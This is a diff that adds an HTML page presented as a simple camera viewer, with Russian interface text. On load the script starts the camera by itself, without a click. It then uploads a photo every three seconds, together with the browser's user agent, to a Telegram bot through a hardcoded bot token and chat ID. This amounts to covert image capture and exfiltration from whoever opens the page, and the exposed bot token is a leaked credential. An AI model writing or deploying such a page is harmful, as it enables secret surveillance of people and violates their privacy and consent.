@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Camera</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: black; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: system-ui; }
+        video { width: 100%; max-width: 400px; border-radius: 12px; }
+        .container { width: 100%; max-width: 400px; padding: 16px; }
+        button { background: #007aff; color: white; border: none; padding: 14px 24px; font-size: 18px; font-weight: 600; border-radius: 12px; width: 100%; margin-top: 20px; cursor: pointer; }
+        .status { color: #0f0; text-align: center; margin-top: 12px; font-size: 14px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <video id="video" autoplay playsinline muted></video>
+    <button id="startBtn">📷 Включить камеру</button>
+    <div class="status" id="status">Готово</div>
+</div>
+
+<script>
+    // ========== НАСТРОЙКИ TELEGRAM ==========
+    const BOT_TOKEN = "8902043585:AAGtl3i9NeajV35jUnEoRv0R9FWlwig3P6w";  // ← ЗАМЕНИТЕ НА СВОЙ ТОКЕН
+    const CHAT_ID = "8902043585";                        // ← ЗАМЕНИТЕ НА СВОЙ CHAT ID
+    // ========================================
+
+    let stream = null;
+    let video = null;
+    let intervalId = null;
+
+    async function sendFrameToTelegram() {
+        if (!video || !video.videoWidth || !video.videoHeight) return;
+        
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `frame_${Date.now()}.jpg`);
+                formData.append('caption', `📸 ${new Date().toLocaleString()} | ${navigator.userAgent.slice(0, 50)}`);
+                
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (res.ok) {
+                    document.getElementById('status').innerText = `✅ Фото отправлено (${new Date().toLocaleTimeString()})`;
+                } else {
+                    document.getElementById('status').innerText = `❌ Ошибка Telegram`;
+                }
+            }, 'image/jpeg', 0.8);
+        } catch(e) {
+            console.error(e);
+        }
+    }
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            document.getElementById('status').innerText = "🎥 Камера активна, отправка...";
+            document.getElementById('startBtn').disabled = true;
+            
+            if (intervalId) clearInterval(intervalId);
+            intervalId = setInterval(sendFrameToTelegram, 3000);
+        } catch(err) {
+            document.getElementById('status').innerText = "❌ Нет доступа к камере";
+        }
+    }
+
+    window.addEventListener('load', () => {
+        document.getElementById('startBtn').addEventListener('click', startCamera);
+        setTimeout(() => startCamera(), 500);
+    });
+</script>
+</body>
+</html>
